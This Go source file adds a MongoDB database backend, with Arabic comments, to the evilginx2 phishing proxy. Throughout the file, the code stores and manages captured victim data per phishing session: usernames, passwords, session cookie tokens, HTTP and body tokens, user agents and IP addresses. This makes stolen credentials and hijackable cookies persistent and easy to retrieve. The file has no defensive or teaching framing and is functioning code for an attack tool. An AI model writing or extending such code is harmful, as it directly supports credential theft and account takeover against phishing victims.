package database

import (
	"context"
	"fmt"
	"time"

	"github.com/kgretzky/evilginx2/log"
	
	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/bson/primitive"
	"go.mongodb.org/mongo-driver/mongo"
	"go.mongodb.org/mongo-driver/mongo/options"
)

// MongoDatabase هو نسخة من قاعدة البيانات تستخدم MongoDB
type MongoDatabase struct {
	client       *mongo.Client
	db           *mongo.Database
	sessionsColl *mongo.Collection
	ctx          context.Context
	cancel       context.CancelFunc
}

// Session مع تعديلات لدعم MongoDB
type MongoSession struct {
	ID           primitive.ObjectID            `bson:"_id,omitempty" json:"_id,omitempty"`
	Id           int                           `bson:"id" json:"id"`
	Phishlet     string                        `bson:"phishlet" json:"phishlet"`
	LandingURL   string                        `bson:"landing_url" json:"landing_url"`
	Username     string                        `bson:"username" json:"username"`
	Password     string                        `bson:"password" json:"password"`
	Custom       map[string]string             `bson:"custom" json:"custom"`
	BodyTokens   map[string]string             `bson:"body_tokens" json:"body_tokens"`
	HttpTokens   map[string]string             `bson:"http_tokens" json:"http_tokens"`
	CookieTokens map[string]map[string]interface{} `bson:"cookie_tokens" json:"tokens"`
	SessionId    string                        `bson:"session_id" json:"session_id"`
	UserAgent    string                        `bson:"useragent" json:"useragent"`
	RemoteAddr   string                        `bson:"remote_addr" json:"remote_addr"`
	CreateTime   int64                         `bson:"create_time" json:"create_time"`
	UpdateTime   int64                         `bson:"update_time" json:"update_time"`
}

// NewMongoDatabase ينشئ اتصالًا جديدًا بقاعدة بيانات MongoDB
func NewMongoDatabase(mongoURI string, dbName string) (*MongoDatabase, error) {
	log.Info("محاولة الاتصال بـ MongoDB على: %s (قاعدة البيانات: %s)", mongoURI, dbName)

	// سيستمر العملية إذا فشل الاتصال (10 ثوان)
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	
	// إنشاء خيارات العميل
	clientOptions := options.Client().
		ApplyURI(mongoURI).
		SetServerSelectionTimeout(15 * time.Second).
		SetConnectTimeout(15 * time.Second).
		SetSocketTimeout(15 * time.Second).
		SetRetryWrites(true).
		SetRetryReads(true).
		SetDirect(false)
	
	// محاولة الاتصال
	log.Debug("[MongoDB] بدء الاتصال...")
	client, err := mongo.Connect(ctx, clientOptions)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("فشل الاتصال بـ MongoDB: %v", err)
	}

	// التحقق من الاتصال
	log.Debug("[MongoDB] اختبار الاتصال...")
	pingCtx, cancelPing := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancelPing()
	
	if err := client.Ping(pingCtx, nil); err != nil {
		cancel()
		client.Disconnect(ctx)
		return nil, fmt.Errorf("فشل اختبار اتصال MongoDB: %v", err)
	}
	log.Info("تم الاتصال بـ MongoDB بنجاح!")

	db := client.Database(dbName)
	sessionsColl := db.Collection("sessions")
	
	// إنشاء فهرس على حقل SessionId للبحث السريع
	log.Debug("[MongoDB] إنشاء فهرس على حقل SessionId...")
	_, err = sessionsColl.Indexes().CreateOne(ctx, mongo.IndexModel{
		Keys:    bson.D{{Key: "session_id", Value: 1}},
		Options: options.Index().SetUnique(true),
	})
	if err != nil {
		cancel()
		client.Disconnect(ctx)
		return nil, fmt.Errorf("فشل إنشاء الفهرس: %v", err)
	}
	log.Debug("[MongoDB] تم إنشاء الفهرس بنجاح")
	
	// عد عدد الجلسات الموجودة
	count, err := sessionsColl.CountDocuments(ctx, bson.M{})
	if err != nil {
		log.Error("[MongoDB] فشل عد الجلسات: %v", err)
	} else {
		log.Info("تم العثور على %d جلسة موجودة في MongoDB", count)
	}

	// إنشاء سياق جديد بدون مهلة للاستخدام في العمليات اللاحقة
	background := context.Background()

	return &MongoDatabase{
		client:       client,
		db:           db,
		sessionsColl: sessionsColl,
		ctx:          background,
		cancel:       cancel,
	}, nil
}

// Close يغلق اتصال قاعدة البيانات
func (m *MongoDatabase) Close() error {
	defer m.cancel()
	return m.client.Disconnect(m.ctx)
}

// convertToMongoSession يحول كائن Session التقليدي إلى كائن MongoSession
func convertToMongoSession(s *Session) *MongoSession {
	// تحويل CookieTokens
	cookieTokens := make(map[string]map[string]interface{})
	for domain, tokens := range s.CookieTokens {
		cookieTokens[domain] = make(map[string]interface{})
		for name, token := range tokens {
			cookieTokens[domain][name] = map[string]interface{}{
				"name":      token.Name,
				"value":     token.Value,
				"path":      token.Path,
				"http_only": token.HttpOnly,
			}
		}
	}

	return &MongoSession{
		Id:           s.Id,
		Phishlet:     s.Phishlet,
		LandingURL:   s.LandingURL,
		Username:     s.Username,
		Password:     s.Password,
		Custom:       s.Custom,
		BodyTokens:   s.BodyTokens,
		HttpTokens:   s.HttpTokens,
		CookieTokens: cookieTokens,
		SessionId:    s.SessionId,
		UserAgent:    s.UserAgent,
		RemoteAddr:   s.RemoteAddr,
		CreateTime:   s.CreateTime,
		UpdateTime:   s.UpdateTime,
	}
}

// convertFromMongoSession يحول كائن MongoSession إلى كائن Session التقليدي
func convertFromMongoSession(ms *MongoSession) *Session {
	// تحويل CookieTokens
	cookieTokens := make(map[string]map[string]*CookieToken)
	for domain, tokens := range ms.CookieTokens {
		cookieTokens[domain] = make(map[string]*CookieToken)
		for name, tokenInterface := range tokens {
			if tokenMap, ok := tokenInterface.(map[string]interface{}); ok {
				cookieTokens[domain][name] = &CookieToken{
					Name:     getStringValue(tokenMap["name"]),
					Value:    getStringValue(tokenMap["value"]),
					Path:     getStringValue(tokenMap["path"]),
					HttpOnly: getBoolValue(tokenMap["http_only"]),
				}
			}
		}
	}

	return &Session{
		Id:           ms.Id,
		Phishlet:     ms.Phishlet,
		LandingURL:   ms.LandingURL,
		Username:     ms.Username,
		Password:     ms.Password,
		Custom:       ms.Custom,
		BodyTokens:   ms.BodyTokens,
		HttpTokens:   ms.HttpTokens,
		CookieTokens: cookieTokens,
		SessionId:    ms.SessionId,
		UserAgent:    ms.UserAgent,
		RemoteAddr:   ms.RemoteAddr,
		CreateTime:   ms.CreateTime,
		UpdateTime:   ms.UpdateTime,
	}
}

// getStringValue يستخرج قيمة نصية من interface{}
func getStringValue(v interface{}) string {
	if v == nil {
		return ""
	}
	if s, ok := v.(string); ok {
		return s
	}
	return fmt.Sprintf("%v", v)
}

// getBoolValue يستخرج قيمة منطقية من interface{}
func getBoolValue(v interface{}) bool {
	if v == nil {
		return false
	}
	if b, ok := v.(bool); ok {
		return b
	}
	return false
}

// GetLastSessionId يحصل على آخر معرف جلسة
func (m *MongoDatabase) GetLastSessionId() (int, error) {
	opts := options.FindOne().SetSort(bson.D{{Key: "id", Value: -1}})
	var session MongoSession
	err := m.sessionsColl.FindOne(m.ctx, bson.D{}, opts).Decode(&session)
	if err != nil {
		if err == mongo.ErrNoDocuments {
			log.Debug("[MongoDB] لم يتم العثور على جلسات، سيتم إنشاء أول جلسة بمعرف 1")
			return 0, nil
		}
		log.Error("[MongoDB] خطأ أثناء الحصول على آخر معرف جلسة: %v", err)
		return 0, err
	}
	log.Debug("[MongoDB] آخر معرف جلسة: %d", session.Id)
	return session.Id, nil
}

// CreateSession ينشئ جلسة جديدة في MongoDB
func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remoteAddr string) error {
	log.Debug("[MongoDB] محاولة إنشاء جلسة جديدة: %s", sid)
	
	// التحقق مما إذا كانت الجلسة موجودة بالفعل
	var existingSession MongoSession
	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&existingSession)
	if err == nil {
		log.Debug("[MongoDB] الجلسة موجودة بالفعل: %s", sid)
		return fmt.Errorf("الجلسة موجودة بالفعل: %s", sid)
	} else if err != mongo.ErrNoDocuments {
		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسة: %v", err)
		return err
	}

	// الحصول على آخر معرف
	lastId, err := m.GetLastSessionId()
	if err != nil {
		log.Error("[MongoDB] خطأ أثناء الحصول على آخر معرف: %v", err)
		return err
	}
	newId := lastId + 1
	log.Debug("[MongoDB] تعيين معرف الجلسة الجديدة: %d", newId)

	// إنشاء جلسة جديدة
	now := time.Now().UTC().Unix()
	newSession := &MongoSession{
		Id:           newId,
		Phishlet:     phishlet,
		LandingURL:   landingURL,
		Username:     "",
		Password:     "",
		Custom:       make(map[string]string),
		BodyTokens:   make(map[string]string),
		HttpTokens:   make(map[string]string),
		CookieTokens: make(map[string]map[string]interface{}),
		SessionId:    sid,
		UserAgent:    useragent,
		RemoteAddr:   remoteAddr,
		CreateTime:   now,
		UpdateTime:   now,
	}

	_, err = m.sessionsColl.InsertOne(m.ctx, newSession)
	if err != nil {
		log.Error("[MongoDB] خطأ أثناء إدراج الجلسة: %v", err)
		return err
	}
	
	log.Debug("[MongoDB] تم إنشاء الجلسة بنجاح: %s (ID: %d)", sid, newId)
	return nil
}

// ListSessions يجلب قائمة الجلسات من MongoDB
func (m *MongoDatabase) ListSessions() ([]*Session, error) {
	log.Debug("[MongoDB] جلب قائمة جميع الجلسات")
	
	cursor, err := m.sessionsColl.Find(m.ctx, bson.M{})
	if err != nil {
		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسات: %v", err)
		return nil, err
	}
	defer cursor.Close(m.ctx)

	var mongoSessions []MongoSession
	if err := cursor.All(m.ctx, &mongoSessions); err != nil {
		log.Error("[MongoDB] خطأ أثناء فك ترميز الجلسات: %v", err)
		return nil, err
	}

	sessions := make([]*Session, 0, len(mongoSessions))
	for i := range mongoSessions {
		sessions = append(sessions, convertFromMongoSession(&mongoSessions[i]))
	}

	log.Debug("[MongoDB] تم العثور على %d جلسة", len(sessions))
	return sessions, nil
}

// GetSessionById يجلب جلسة من MongoDB باستخدام المعرف العددي
func (m *MongoDatabase) GetSessionById(id int) (*Session, error) {
	var mongoSession MongoSession
	err := m.sessionsColl.FindOne(m.ctx, bson.M{"id": id}).Decode(&mongoSession)
	if err != nil {
		if err == mongo.ErrNoDocuments {
			return nil, fmt.Errorf("الجلسة غير موجودة بالمعرف: %d", id)
		}
		return nil, err
	}

	return convertFromMongoSession(&mongoSession), nil
}

// GetSessionBySid يجلب جلسة من MongoDB باستخدام معرف الجلسة
func (m *MongoDatabase) GetSessionBySid(sid string) (*Session, error) {
	log.Debug("[MongoDB] البحث عن الجلسة بواسطة SID: %s", sid)
	
	var mongoSession MongoSession
	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&mongoSession)
	if err != nil {
		if err == mongo.ErrNoDocuments {
			log.Debug("[MongoDB] الجلسة غير موجودة: %s", sid)
			return nil, fmt.Errorf("الجلسة غير موجودة: %s", sid)
		}
		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسة: %v", err)
		return nil, err
	}
	
	log.Debug("[MongoDB] تم العثور على الجلسة: %s (ID: %d)", sid, mongoSession.Id)
	return convertFromMongoSession(&mongoSession), nil
}

// UpdateSession يحدث جلسة في MongoDB
func (m *MongoDatabase) UpdateSession(s *Session) error {
	mongoSession := convertToMongoSession(s)
	mongoSession.UpdateTime = time.Now().UTC().Unix()

	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"id": s.Id},
		bson.M{"$set": mongoSession},
	)
	return err
}

// UpdateSessionUsername يحدث اسم المستخدم للجلسة
func (m *MongoDatabase) UpdateSessionUsername(sid, username string) error {
	now := time.Now().UTC().Unix()
	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"session_id": sid},
		bson.M{
			"$set": bson.M{
				"username":    username,
				"update_time": now,
			},
		},
	)
	return err
}

// UpdateSessionPassword يحدث كلمة المرور للجلسة
func (m *MongoDatabase) UpdateSessionPassword(sid, password string) error {
	now := time.Now().UTC().Unix()
	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"session_id": sid},
		bson.M{
			"$set": bson.M{
				"password":    password,
				"update_time": now,
			},
		},
	)
	return err
}

// UpdateSessionCustom يحدث بيانات مخصصة للجلسة
func (m *MongoDatabase) UpdateSessionCustom(sid, name, value string) error {
	now := time.Now().UTC().Unix()
	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"session_id": sid},
		bson.M{
			"$set": bson.M{
				fmt.Sprintf("custom.%s", name): value,
				"update_time":                  now,
			},
		},
	)
	return err
}

// UpdateSessionCookieTokens يحدث رموز الكوكيز للجلسة
func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	// تحويل رموز الكوكيز إلى التنسيق المناسب لـ MongoDB
	cookieTokens := make(map[string]map[string]interface{})
	for domain, domainTokens := range tokens {
		cookieTokens[domain] = make(map[string]interface{})
		for name, token := range domainTokens {
			cookieTokens[domain][name] = map[string]interface{}{
				"name":      token.Name,
				"value":     token.Value,
				"path":      token.Path,
				"http_only": token.HttpOnly,
			}
		}
	}

	now := time.Now().UTC().Unix()
	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"session_id": sid},
		bson.M{
			"$set": bson.M{
				"cookie_tokens": cookieTokens,
				"update_time":   now,
			},
		},
	)
	return err
}

// DeleteSessionById يحذف جلسة باستخدام المعرف العددي
func (m *MongoDatabase) DeleteSessionById(id int) error {
	log.Debug("[MongoDB] محاولة حذف الجلسة بالمعرف العددي: %d", id)
	
	result, err := m.sessionsColl.DeleteOne(m.ctx, bson.M{"id": id})
	if err != nil {
		log.Error("[MongoDB] خطأ أثناء حذف الجلسة بالمعرف %d: %v", id, err)
		return err
	}
	
	if result.DeletedCount == 0 {
		log.Debug("[MongoDB] لم يتم حذف أي جلسة، ربما لم يتم العثور على جلسة بالمعرف %d", id)
		return fmt.Errorf("لم يتم العثور على جلسة بالمعرف: %d", id)
	}
	
	log.Debug("[MongoDB] تم حذف الجلسة بالمعرف %d بنجاح", id)
	return nil
}

// DeleteSession يحذف جلسة باستخدام معرف الجلسة (sid)
func (m *MongoDatabase) DeleteSession(sid string) error {
	_, err := m.sessionsColl.DeleteOne(m.ctx, bson.M{"session_id": sid})
	return err
}

// Flush لا يؤثر في MongoDB لكن موجود للتوافق مع الواجهة
func (m *MongoDatabase) Flush() {
	// لا حاجة للتنفيذ في MongoDB
}

// UpdateSessionBodyTokens يحدث رموز الهيكل للجلسة
func (m *MongoDatabase) SetSessionBodyTokens(sid string, tokens map[string]string) error {
	now := time.Now().UTC().Unix()
	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"session_id": sid},
		bson.M{
			"$set": bson.M{
				"body_tokens": tokens,
				"update_time": now,
			},
		},
	)
	return err
}

// UpdateSessionHttpTokens يحدث رموز HTTP للجلسة
func (m *MongoDatabase) SetSessionHttpTokens(sid string, tokens map[string]string) error {
	now := time.Now().UTC().Unix()
	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"session_id": sid},
		bson.M{
			"$set": bson.M{
				"http_tokens": tokens,
				"update_time": now,
			},
		},
	)
	return err
}

// UpdateSessionUsername يحدث اسم المستخدم للجلسة
func (m *MongoDatabase) SetSessionUsername(sid string, username string) error {
	return m.UpdateSessionUsername(sid, username)
}

// UpdateSessionPassword يحدث كلمة المرور للجلسة
func (m *MongoDatabase) SetSessionPassword(sid string, password string) error {
	return m.UpdateSessionPassword(sid, password)
}

// UpdateSessionCustom يحدث بيانات مخصصة للجلسة
func (m *MongoDatabase) SetSessionCustom(sid string, name, value string) error {
	return m.UpdateSessionCustom(sid, name, value)
}

// SetSessionCookieTokens يحدث رموز الكوكيز للجلسة
func (m *MongoDatabase) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	return m.UpdateSessionCookieTokens(sid, tokens)
} 